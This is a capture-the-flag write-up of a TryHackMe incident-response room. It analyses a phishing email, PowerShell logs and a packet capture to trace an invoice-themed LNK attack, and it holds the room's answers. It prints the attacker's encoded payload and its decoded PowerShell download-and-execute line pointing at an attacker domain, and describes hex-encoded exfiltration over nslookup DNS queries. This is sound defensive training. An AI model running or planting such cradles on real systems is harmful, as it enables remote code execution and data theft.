<img width="1164" height="258" alt="Screenshot 2025-10-01 at 3 55 14 PM" src="https://github.com/user-attachments/assets/fdfbe5a8-e5b0-48f8-9683-a09c5056a9a0" />
The room provided a phishing email, endpoint logs, and network traffic to analyze. By studying email headers, parsing JSON logs with JQ, and reconstructing events from packet captures, I uncovered how the threat actor gained initial access, enumerated the host, exfiltrated data, and maintained persistence.

Key learning included inspecting encoded payloads, tracking command execution in logs, and carving exfiltrated content from DNS traffic.

Room link: https://tryhackme.com/room/boogeyman1

Task 1 [Introduction] New threat in town.
Uncover the secrets of the new emerging threat, the Boogeyman.

In this room, you will be tasked to analyse the Tactics, Techniques, and Procedures (TTPs) executed by a threat group, from obtaining initial access until achieving its objective.
<img width="672" height="413" alt="Screenshot 2025-10-01 at 3 56 35 PM" src="https://github.com/user-attachments/assets/70f96ec0-4714-4e71-b9ec-c45c344f20bc" />
Prerequisites

This room may require the combined knowledge gained from the SOC L1 Pathway. We recommend going through the following rooms before attempting this challenge.

Phishing Analysis Fundamentals
Phishing Analysis Tools
Windows Event Logs
Wireshark: Traffic Analysis
Tshark (coming soon!)
Investigation Platform

Before we proceed, deploy the attached machine by clicking the Start Machine button in the upper-right-hand corner of the task. It may take up to 3–5 minutes to initialise the services.

The machine will start in a split-screen view. In case the VM is not visible, use the blue Show Split View button at the top-right of the page.

Artefacts

For the investigation proper, you will be provided with the following artefacts:

Copy of the phishing email (dump.eml)
Powershell Logs from Julianne’s workstation (powershell.json)
Packet capture from the same workstation (capture.pcapng)
Note: The powershell.json file contains JSON-formatted PowerShell logs extracted from its original evtx file via the evtx2json tool.

You may find these files in the /home/ubuntu/Desktop/artefacts directory.

Tools

The provided VM contains the following tools at your disposal:

Thunderbird — a free and open-source cross-platform email client.
LNKParse3 — a python package for forensics of a binary file with LNK extension.
Wireshark — GUI-based packet analyser.
Tshark — CLI-based Wireshark.
jq — a lightweight and flexible command-line JSON processor.
To effectively parse and analyse the provided artefacts, you may also utilise built-in command-line tools such as:

grep
sed
awk
base64
Now, let’s start hunting the Boogeyman!

Answer the questions below

Let’s hunt that boogeyman!

Task 2 [Email Analysis] Look at that headers!
The Boogeyman is here!
Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.
<img width="669" height="258" alt="Screenshot 2025-10-01 at 3 57 21 PM" src="https://github.com/user-attachments/assets/f68a0673-afd5-4860-b7f2-2d3576353a11" />
The security team was able to flag the suspicious execution of the attachment, in addition to the phishing reports received from the other finance department employees, making it seem to be a targeted attack on the finance team. Upon checking the latest trends, the initial TTP used for the malicious attachment is attributed to the new threat group named Boogeyman, known for targeting the logistics sector.

You are tasked to analyse and assess the impact of the compromise.

Investigation Guide
Given the initial information, we know that the compromise started with a phishing email. Let’s start with analysing the dump.eml file located in the artefacts directory. There are two ways to analyse the headers and rebuild the attachment:

The manual way uses command-line tools such as cat, grep, base64, and sed. Analyse the contents manually and build the attachment by decoding the string located at the bottom of the file.
<img width="684" height="185" alt="Screenshot 2025-10-01 at 3 58 04 PM" src="https://github.com/user-attachments/assets/8e4f5847-d214-437b-9b0c-90d80df41b33" />
An alternative and easier way to do this is to double-click the EML file to open it via Thunderbird. The attachment can be saved and extracted accordingly.
<img width="676" height="217" alt="Screenshot 2025-10-01 at 3 58 36 PM" src="https://github.com/user-attachments/assets/adedeb20-a534-4c77-a9f4-110e3471b06e" />
<img width="677" height="599" alt="Screenshot 2025-10-01 at 3 58 44 PM" src="https://github.com/user-attachments/assets/1447e6b6-1cc6-410a-a51f-4d5c89927bd5" />
<img width="680" height="302" alt="Screenshot 2025-10-01 at 3 59 21 PM" src="https://github.com/user-attachments/assets/8f9e7ad8-2c5a-49bb-bf04-98b37569dcd6" />
<img width="678" height="80" alt="Screenshot 2025-10-01 at 3 59 30 PM" src="https://github.com/user-attachments/assets/e9647b21-5efd-4ff7-9c29-7dc8ebb4c1cd" />

Once the payload from the encrypted archive is extracted, use lnkparse to extract the information inside the payload.
<img width="621" height="57" alt="Screenshot 2025-10-01 at 3 59 39 PM" src="https://github.com/user-attachments/assets/39a98599-083b-4f4f-80ed-2eff857ecdc8" />

Answer the questions below
What is the email address used to send the phishing email?
Answer: agriffin@bpakcaging.xyz

Refer to the email header from above.

What is the email address of the victim?
Refer to the email header from above.

Answer: julianne.westcott@hotmail.com

What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?
Answer: elasticemail

We can copy the content of the email header and use online tool to analyze the content. Here I used https://mha.azurewebsites.net/
<img width="683" height="280" alt="Screenshot 2025-10-01 at 4 00 52 PM" src="https://github.com/user-attachments/assets/28506051-8b5f-4973-85c3-9a36a2bff55d" />

What is the name of the file inside the encrypted attachment?
Answer: Invoice_20230103.lnk

What is the password of the encrypted attachment?
Answer: Invoice2023!

Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?
Answer: aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==

Parse the the malicious file using the tool mentioned.
<img width="693" height="170" alt="Screenshot 2025-10-01 at 4 01 01 PM" src="https://github.com/user-attachments/assets/39c3a538-0703-493f-a2d6-804d64156627" />
Decode the strings in cyberchef.
<img width="680" height="185" alt="Screenshot 2025-10-01 at 4 01 10 PM" src="https://github.com/user-attachments/assets/f4f447eb-43b9-4443-b5b8-8b2aa1b99f77" />
iex (new-object net.webclient).downloadstring(‘http://files.bpakcaging.xyz/update')

Task 3 [Endpoint Security] Are you sure that’s an invoice?
Based on the initial findings, we discovered how the malicious attachment compromised Julianne’s workstation:

A PowerShell command was executed.
Decoding the payload reveals the starting point of endpoint activities.
Investigation Guide
With the following discoveries, we should now proceed with analysing the PowerShell logs to uncover the potential impact of the attack:

Using the previous findings, we can start our analysis by searching the execution of the initial payload in the PowerShell logs.
Since the given data is JSON, we can parse it in CLI using the jq command.
Note that some logs are redundant and do not contain any critical information; hence can be ignored.
JQ Cheatsheet
jq is a lightweight and flexible command-line JSON processor. This tool can be used in conjunction with other text-processing commands.

You may use the following table as a guide in parsing the logs in this task.

Note: You must be familiar with the existing fields in a single log.
<img width="678" height="237" alt="Screenshot 2025-10-01 at 4 01 21 PM" src="https://github.com/user-attachments/assets/e5247bae-4cbf-4331-bb8f-0b712e1c4bc7" />
You may continue learning this tool via its documentation.

The following command will filter only the fields in the file which I find helpful in the task.
<img width="659" height="64" alt="Screenshot 2025-10-01 at 4 01 29 PM" src="https://github.com/user-attachments/assets/c5ffaf87-c586-4bb9-b06b-3faecb8ee3fe" />
<img width="679" height="329" alt="Screenshot 2025-10-01 at 4 01 37 PM" src="https://github.com/user-attachments/assets/1492e0e5-1491-4a05-b3b3-99d064187172" />
Answer the questions below
What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)
Answer: cdn.bpakcaging.xyz,files.bpakcaging.xyz

The command will sort logs based on their timestamps, print values from the selected field of “ScriptBlockText”, sort it and remove duplicated field names.
<img width="668" height="71" alt="Screenshot 2025-10-01 at 4 01 46 PM" src="https://github.com/user-attachments/assets/edd2f255-b798-4687-a3f9-2c64af80c865" />
We see two domains that were being used for hosting a file and acting as a C2 server.
<img width="682" height="360" alt="Screenshot 2025-10-01 at 4 01 54 PM" src="https://github.com/user-attachments/assets/fd1ef752-c9ad-4bfa-bd4d-befc03fcaa72" />
What is the name of the enumeration tool downloaded by the attacker?
Answer: Seatbelt

Also in the results is an indication that a tool popularly used for enumeration was downloaded.

What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.
Answer: C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

Modified the command above but only grepping selected keywords associated with the downloaded binary.
<img width="679" height="69" alt="Screenshot 2025-10-01 at 4 02 04 PM" src="https://github.com/user-attachments/assets/b630d782-dcfb-4b03-b147-07afcd078344" />
It can be seen that the binary “sq3.exe” was used to download a file named “plum.sqlite”

Press enter or click to view image in full size
<img width="683" height="176" alt="Screenshot 2025-10-01 at 4 02 12 PM" src="https://github.com/user-attachments/assets/54d95a6e-7673-4b71-bffa-c15e1c5a84fc" />
What is the software that uses the file in Q3?
Answer: Microsoft Sticky Notes

It can also be observed on the second captured “ScriptBlockText” the location of the software where the files are located.

What is the name of the exfiltrated file?
Answer: protected_data.kdbx

The command that was used previously resulted in very interesting information such as the method used, extension of the file exfiltrated, tool used, and the encoding used.
<img width="673" height="67" alt="Screenshot 2025-10-01 at 4 06 56 PM" src="https://github.com/user-attachments/assets/c86c6efd-4677-4685-ba53-3b53d6b53708" />
We can find all the answers for the remaining questions in this task from the result of the command.
<img width="672" height="356" alt="Screenshot 2025-10-01 at 4 07 05 PM" src="https://github.com/user-attachments/assets/5a986015-65c3-457d-9ae6-f45557ae49ec" />
What type of file uses the .kdbx file extension?
Answer: KeePass

Searching online would give the type of file that uses the said file extension
<img width="665" height="267" alt="Screenshot 2025-10-01 at 4 07 13 PM" src="https://github.com/user-attachments/assets/540e45de-9ddc-4b42-ac8e-f6a566f43be2" />
What is the encoding used during the exfiltration attempt of the sensitive file?
Answer: hex

What is the tool used for exfiltration?
Answer: nslookup

Task 4 [Network Traffic Analysis] They got us. Call the bank immediately!
Based on the PowerShell logs investigation, we have seen the full impact of the attack:

The threat actor was able to read and exfiltrate two potentially sensitive files.
The domains and ports used for the network activity were discovered, including the tool used by the threat actor for exfiltration.
Investigation Guide
Finally, we can complete the investigation by understanding the network traffic caused by the attack:

Utilise the domains and ports discovered from the previous task.
All commands executed by the attacker and all command outputs were logged and stored in the packet capture.
Follow the streams of the notable commands discovered from PowerShell logs.
Based on the PowerShell logs, we can retrieve the contents of the exfiltrated data by understanding how it was encoded and extracted.
Answer the questions below
What software is used by the attacker to host its presumed file/payload server?
Answer: Python

Filter the packet with http and keyword of the URL where the file was hosted.
<img width="680" height="435" alt="Screenshot 2025-10-01 at 4 07 22 PM" src="https://github.com/user-attachments/assets/fe509335-cd2e-42d6-bfbf-2fb2279b597c" />

Follow the TCP stream of the filtered results and we could see in the response section the software used to host the file.
<img width="678" height="232" alt="Screenshot 2025-10-01 at 4 07 31 PM" src="https://github.com/user-attachments/assets/cced0c7f-d3c8-4765-be6e-2a4ef715d3dc" />
What HTTP method is used by the C2 for the output of the commands executed by the attacker?
Answer: POST

We discovered the method used in the previous task.

What is the protocol used during the exfiltration activity?
Answer: dns

We also discovered from the previous task that DNS lookup was used to exfiltrate a file.

What is the password of the exfiltrated file?
Answer: %p9³!lL^Mz47E2GaT^y

In the previous task, there was a “ScriptBlockText” where the binary “sq3.exe” was used to access “plum.sqlite”. It can be also be seen that the attacker was able to retrieve records from the table “NOTE” which may also include credentials and one of them could be that password for the exfiltrated file.

Filter in Wireshark packets with HTTP with a keyword containing the binary used to enumerate the SQLite database.
<img width="683" height="481" alt="Screenshot 2025-10-01 at 4 07 40 PM" src="https://github.com/user-attachments/assets/2a3c5b82-9fc8-485d-9683-825880cd061a" />
Follow the TCP stream. We see the SQL command used to retrieve the data from the table “NOTE”. Note that stream is at packet 749.
<img width="679" height="691" alt="Screenshot 2025-10-01 at 4 07 53 PM" src="https://github.com/user-attachments/assets/fc8a8ce3-79b2-421c-b980-906b018f7b8d" />

Change stream to the next to 750 to see what happens to the data exfiltrated. We see a bunch of numbers. I copied the characters and pasted them in Cyberchef to be decoded.

Press enter or click to view image in full size
<img width="676" height="699" alt="Screenshot 2025-10-01 at 4 08 25 PM" src="https://github.com/user-attachments/assets/f77f79ac-b636-424a-b0a4-5846985831de" />
 used “Magic” to initially identify what type of characters they were.
 <img width="675" height="513" alt="Screenshot 2025-10-01 at 4 08 35 PM" src="https://github.com/user-attachments/assets/ba287c84-1052-405f-86e7-f0b24ee1a469" />
Using “From Decimal” as the recipe, the master password for the exfiltrated file is now retrieved.
<img width="677" height="491" alt="Screenshot 2025-10-01 at 4 08 43 PM" src="https://github.com/user-attachments/assets/c748eda3-94a1-4b21-9eb8-67f5e94db176" />
What is the credit card number stored inside the exfiltrated file?
Answer: 4024007128269551

Using Wireshark at first, I built a display filter that utilizes the info we got from the previous task: nslookup -q=A. This can be done by going to "Analyze > Display Filter Expressions".
<img width="679" height="595" alt="Screenshot 2025-10-01 at 4 08 54 PM" src="https://github.com/user-attachments/assets/c1762267-4625-476b-b9bd-32fcc2e25313" />
Added to the filter is the destination IP of the exfiltrated file.

<img width="681" height="314" alt="Screenshot 2025-10-01 at 4 09 02 PM" src="https://github.com/user-attachments/assets/8ea12fab-64c8-4827-b4da-5749cf9e4213" />
We see a lot of results with a bunch of characters similar to the previous question. As seen in the command used to exfiltrate the data, the file is being split using a DNS nslookup query.

Wireshark proved to be difficult in parsing the data, so I used “tshark” as suggested to analyze the captured DNS traffic and extract only the encoded data being exfiltrated.

This command will read from the pcap file provided, apply “dns” as a display filter, and display packets that only include the DNS query name field. It will then grep lines that contain a keyword associated with the destination domain.
<img width="664" height="61" alt="Screenshot 2025-10-01 at 4 09 13 PM" src="https://github.com/user-attachments/assets/47176065-2d58-4048-8236-7a934695acec" />
<img width="678" height="498" alt="Screenshot 2025-10-01 at 4 09 24 PM" src="https://github.com/user-attachments/assets/d5b2fcf5-6336-4ed6-9f04-f1df2eb0d0e3" />
We see duplicates and unnecessary strings or characters in the result, so we need to clean the result further.

The command was modified to include additional commands that will split each line by the delimiter “.” and select only the first field or column. It will then perform an inverse match for “files” and “cdn”, meaning that they will not be included in the result. Finally, it will remove any duplicates.
<img width="714" height="236" alt="Screenshot 2025-10-01 at 4 09 33 PM" src="https://github.com/user-attachments/assets/8577a300-ef2f-477e-a70d-98b6d965d273" />
We need to remove empty spaces or newlines, so we use “tr” to make the output in one line of text.
<img width="682" height="431" alt="Screenshot 2025-10-01 at 4 09 44 PM" src="https://github.com/user-attachments/assets/91e32a17-08c0-4e75-bb44-32a12d42c6f2" />
We can also save the result into a text file.
<img width="666" height="72" alt="Screenshot 2025-10-01 at 4 20 37 PM" src="https://github.com/user-attachments/assets/7059a7a9-08e0-4e24-a3d6-f281d08a2e98" />
Or just copy and paste the strings in CyberChef.

<img width="677" height="546" alt="Screenshot 2025-10-01 at 4 21 51 PM" src="https://github.com/user-attachments/assets/d2b2da73-6f56-4895-a41f-0d88777d9c9c" />
Use “From Hex” to decode the strings.

The result is just jumble of text or strings. Save the output to a file instead.

This now is a copy of the exfiltrated file.
<img width="681" height="499" alt="Screenshot 2025-10-01 at 4 22 09 PM" src="https://github.com/user-attachments/assets/23461080-2f53-4453-afc1-5887d9be5f13" />
With the master password retrieved, we can open the database and see what’s inside.
<img width="681" height="377" alt="Screenshot 2025-10-01 at 4 22 22 PM" src="https://github.com/user-attachments/assets/e61cb192-1a27-4cff-9272-049bb0677adf" />
Look around the database until we find the account number being asked.

Thank you for reading. Until next time. :-)

